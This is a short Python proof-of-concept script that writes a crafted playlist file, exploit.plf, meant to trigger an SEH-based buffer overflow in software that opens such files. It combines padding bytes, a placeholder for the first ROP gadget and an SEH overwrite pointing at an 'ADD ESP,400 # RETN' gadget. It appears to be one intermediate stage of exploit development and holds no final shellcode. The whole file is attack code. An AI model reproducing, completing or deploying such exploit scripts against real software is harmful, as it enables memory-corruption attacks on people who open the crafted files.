#!/usr/bin/env python
# PoC4.py
import struct

junk1 = "A"*304 # Initial junk that will be cut off (first 280 bytes are skipped)

rop = "BBBB"    # First ROP

junk2 = "C"*(612 - len(rop) - len(junk1))

seh = struct.pack('L',0x600148df) # ADD ESP,400 # RETN

payload = junk1 + rop + junk2 + seh

f = open('exploit.plf','w')
f.write(payload)
f.close()
